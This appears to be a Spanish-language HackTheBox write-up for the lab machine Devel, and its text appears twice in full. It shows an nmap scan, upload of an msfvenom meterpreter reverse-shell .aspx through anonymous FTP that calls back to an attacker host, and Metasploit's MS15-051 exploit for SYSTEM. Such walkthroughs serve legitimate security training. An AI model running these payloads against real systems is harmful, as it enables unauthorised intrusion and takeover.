---
title: "Devel - HackTheBox (Easy)"
machine: "Devel"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
tags: ["RCE", "Privesc", "FTP", "Web"]
retired: true
summary: "Fecha: 01 de Mayo de 2026"
draft: false
---
**Fecha:** 01 de Mayo de 2026

**Dificultad:** Easy

**SO:** Windows

**IP:** 10.129.227.181

---

## Índice

1. [Descripción General](https://www.google.com/search?q=%23descripci%C3%B3n-general)
2. [Reconocimiento](https://www.google.com/search?q=%23reconocimiento)
3. [Acceso Inicial - Explotación de FTP](https://www.google.com/search?q=%23acceso-inicial---explotaci%C3%B3n-de-ftp)
4. [Escalada de Privilegios](https://www.google.com/search?q=%23escalada-de-privilegios)
    - [Enumeración Post-Explotación](https://www.google.com/search?q=%23enumeraci%C3%B3n-post-explotaci%C3%B3n)
    - [Explotación del Kernel (MS15-051)](https://www.google.com/search?q=%23explotaci%C3%B3n-del-kernel-ms15-051)
5. [Flags](https://www.google.com/search?q=%23flags)
6. [Resumen de la Cadena de Ataque](https://www.google.com/search?q=%23resumen-de-la-cadena-ataque)

---

## Descripción General

Devel es una máquina Windows de dificultad básica que ilustra los riesgos de una mala configuración de servicios integrados. El vector de ataque consiste en un servidor FTP con acceso anónimo y permisos de escritura que comparte el directorio raíz con el servidor web IIS. La escalada de privilegios se logra mediante la explotación de una vulnerabilidad de kernel en un sistema Windows 7 sin parches.

**Tecnologías clave:** FTP (Anonymous), Microsoft IIS 7.5, ASP.NET, MSFVenom, Kernel Exploit (MS15-051).

---

## Reconocimiento

### Escaneo Nmap

Se realizó un escaneo de servicios y detección de vulnerabilidades sobre los puertos abiertos:

Bash

`sudo nmap 10.129.227.181 -p 21,80 -sCV -Pn -n --script vuln`

| **Puerto** | **Estado** | **Servicio** | **Versión** |
| --- | --- | --- | --- |
| 21/tcp | Open | FTP | Microsoft ftpd |
| 80/tcp | Open | HTTP | Microsoft IIS httpd 7.5 |

**Análisis técnico:**

- El servidor web **IIS 7.5** sugiere un sistema **Windows 7** o **Server 2008 R2**.
- Se detectaron múltiples vulnerabilidades de DoS, pero ninguna de RCE directa por servicio.
- El servicio FTP permite el inicio de sesión como `anonymous`.

---

## Acceso Inicial - Explotación de FTP

### Enumeración de FTP

Al acceder mediante `ftp anonymous`, se observa que el directorio raíz contiene archivos web estándar (`iisstart.htm`, `welcome.png`). Esto confirma que el FTP tiene acceso directo al **Webroot** del servidor IIS.

### Generación de Payload

Se utiliza `msfvenom` para generar una shell reversa en formato `.aspx` compatible con el motor de ASP.NET detectado en el servidor:

Bash

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.254 LPORT=4444 -f aspx > shell.aspx`

### Transferencia y Ejecución

Se sube el archivo asegurando el modo de transferencia **binario** para evitar la corrupción del payload:

Bash

`ftp> binary
ftp> put shell.aspx`

Se configura un `multi/handler` en Metasploit y se detona el payload accediendo vía navegador a: `http://10.129.227.181/shell.aspx`.

**Resultado:** Acceso inicial exitoso como el usuario de bajos privilegios `iis apppool\web`.

---

## Escalada de Privilegios

### Enumeración Post-Explotación

Dentro de la sesión de Meterpreter, se analiza la versión exacta del sistema operativo:

DOS

`c:\> whoami
iis apppool\web

c:\> systeminfo
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600`

El sistema es una versión "Gold" de Windows 7 (Build 7600) sin Service Packs, lo que lo hace altamente vulnerable a exploits locales de kernel.

### Explotación del Kernel (MS15-051)

Se utiliza el módulo `local_exploit_suggester` de Metasploit, el cual identifica múltiples vectores. Se selecciona **MS15-051** por su alta estabilidad.

Bash

`use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST 10.10.15.254
run`

**Resultado:** Se abre una segunda sesión de Meterpreter con privilegios máximos.

---

## Flags

- **User Flag:** Obtenida en el escritorio del usuario `babis`.
    - `type C:\Users\babis\Desktop\user.txt`
- **Root Flag:** Obtenida en el escritorio del administrador.
    - `type C:\Users\Administrator\Desktop\root.txt`

---

## Resumen de la Cadena de Ataque

1. **FTP Anónimo:** Identificación de permisos de escritura en la raíz del servidor web.
2. **Webshell Upload:** Subida de un payload `.aspx` malicioso vía FTP.
3. **RCE:** Ejecución del payload mediante petición HTTP al servidor IIS.
4. **Local Recon:** Identificación de vulnerabilidad en el Kernel de Windows 7 (Build 7600).
5. **PrivEsc:** Explotación de `MS15-051` para obtener privilegios de `NT AUTHORITY\SYSTEM`.

---

### Herramientas Utilizadas

- **Nmap:** Reconocimiento y detección de vulnerabilidades.
- **MSFVenom:** Generación de payloads personalizados.
- **Metasploit Framework:** Gestión de sesiones, sugerencia de exploits y escalada de privilegios.
- **FTP Client:** Interacción y transferencia de archivos.

# Devel - HackTheBox (Easy)

**Fecha:** 01 de Mayo de 2026

**Dificultad:** Easy

**SO:** Windows

**IP:** 10.129.227.181

---

## Índice

1. [Descripción General](https://www.google.com/search?q=%23descripci%C3%B3n-general)
2. [Reconocimiento](https://www.google.com/search?q=%23reconocimiento)
3. [Acceso Inicial - Explotación de FTP](https://www.google.com/search?q=%23acceso-inicial---explotaci%C3%B3n-de-ftp)
4. [Escalada de Privilegios](https://www.google.com/search?q=%23escalada-de-privilegios)
    - [Enumeración Post-Explotación](https://www.google.com/search?q=%23enumeraci%C3%B3n-post-explotaci%C3%B3n)
    - [Explotación del Kernel (MS15-051)](https://www.google.com/search?q=%23explotaci%C3%B3n-del-kernel-ms15-051)
5. [Flags](https://www.google.com/search?q=%23flags)
6. [Resumen de la Cadena de Ataque](https://www.google.com/search?q=%23resumen-de-la-cadena-ataque)

---

## Descripción General

Devel es una máquina Windows de dificultad básica que ilustra los riesgos de una mala configuración de servicios integrados. El vector de ataque consiste en un servidor FTP con acceso anónimo y permisos de escritura que comparte el directorio raíz con el servidor web IIS. La escalada de privilegios se logra mediante la explotación de una vulnerabilidad de kernel en un sistema Windows 7 sin parches.

**Tecnologías clave:** FTP (Anonymous), Microsoft IIS 7.5, ASP.NET, MSFVenom, Kernel Exploit (MS15-051).

---

## Reconocimiento

### Escaneo Nmap

Se realizó un escaneo de servicios y detección de vulnerabilidades sobre los puertos abiertos:

Bash

`sudo nmap 10.129.227.181 -p 21,80 -sCV -Pn -n --script vuln`

| **Puerto** | **Estado** | **Servicio** | **Versión** |
| --- | --- | --- | --- |
| 21/tcp | Open | FTP | Microsoft ftpd |
| 80/tcp | Open | HTTP | Microsoft IIS httpd 7.5 |

**Análisis técnico:**

- El servidor web **IIS 7.5** sugiere un sistema **Windows 7** o **Server 2008 R2**.
- Se detectaron múltiples vulnerabilidades de DoS, pero ninguna de RCE directa por servicio.
- El servicio FTP permite el inicio de sesión como `anonymous`.

---

## Acceso Inicial - Explotación de FTP

### Enumeración de FTP

Al acceder mediante `ftp anonymous`, se observa que el directorio raíz contiene archivos web estándar (`iisstart.htm`, `welcome.png`). Esto confirma que el FTP tiene acceso directo al **Webroot** del servidor IIS.

### Generación de Payload

Se utiliza `msfvenom` para generar una shell reversa en formato `.aspx` compatible con el motor de ASP.NET detectado en el servidor:

Bash

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.254 LPORT=4444 -f aspx > shell.aspx`

### Transferencia y Ejecución

Se sube el archivo asegurando el modo de transferencia **binario** para evitar la corrupción del payload:

Bash

`ftp> binary
ftp> put shell.aspx`

Se configura un `multi/handler` en Metasploit y se detona el payload accediendo vía navegador a: `http://10.129.227.181/shell.aspx`.

**Resultado:** Acceso inicial exitoso como el usuario de bajos privilegios `iis apppool\web`.

---

## Escalada de Privilegios

### Enumeración Post-Explotación

Dentro de la sesión de Meterpreter, se analiza la versión exacta del sistema operativo:

DOS

`c:\> whoami
iis apppool\web

c:\> systeminfo
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600`

El sistema es una versión "Gold" de Windows 7 (Build 7600) sin Service Packs, lo que lo hace altamente vulnerable a exploits locales de kernel.

### Explotación del Kernel (MS15-051)

Se utiliza el módulo `local_exploit_suggester` de Metasploit, el cual identifica múltiples vectores. Se selecciona **MS15-051** por su alta estabilidad.

Bash

`use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST 10.10.15.254
run`

**Resultado:** Se abre una segunda sesión de Meterpreter con privilegios máximos.

---

## Flags

- **User Flag:** Obtenida en el escritorio del usuario `babis`.
    - `type C:\Users\babis\Desktop\user.txt`
- **Root Flag:** Obtenida en el escritorio del administrador.
    - `type C:\Users\Administrator\Desktop\root.txt`

---

## Resumen de la Cadena de Ataque

1. **FTP Anónimo:** Identificación de permisos de escritura en la raíz del servidor web.
2. **Webshell Upload:** Subida de un payload `.aspx` malicioso vía FTP.
3. **RCE:** Ejecución del payload mediante petición HTTP al servidor IIS.
4. **Local Recon:** Identificación de vulnerabilidad en el Kernel de Windows 7 (Build 7600).
5. **PrivEsc:** Explotación de `MS15-051` para obtener privilegios de `NT AUTHORITY\SYSTEM`.

---

### Herramientas Utilizadas

- **Nmap:** Reconocimiento y detección de vulnerabilidades.
- **MSFVenom:** Generación de payloads personalizados.
- **Metasploit Framework:** Gestión de sesiones, sugerencia de exploits y escalada de privilegios.
- **FTP Client:** Interacción y transferencia de archivos.
